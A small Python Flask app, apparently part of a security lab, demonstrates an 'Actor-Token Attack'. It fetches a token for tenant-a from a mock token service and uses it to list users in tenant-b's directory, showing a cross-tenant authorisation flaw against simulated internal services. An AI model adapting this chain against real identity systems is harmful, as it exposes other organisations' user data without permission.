"""Entra Actor token: tenant-A token accepted against tenant-B's directory."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
STS = os.environ.get("STS_URL", "http://sts:5000")
DIR = os.environ.get("DIR_URL", "http://directory-api:5000")

HTML = """<h1>Actor-Token Attack</h1>
<form method="post" action="/run"><button>Run chain</button></form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/run", methods=["POST"])
def run():
    tok = requests.post(f"{STS}/token", json={"tenant": "tenant-a"}, timeout=8).json()["token"]
    r = requests.get(f"{DIR}/api/users", params={"tenant": "tenant-b"},
                     headers={"Authorization": f"Bearer {tok}"}, timeout=8)
    return HTML.replace("{{out}}", f"token claims: tenant-a\n\n"
                                   f"GET /api/users?tenant=tenant-b ->\n{r.text}")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
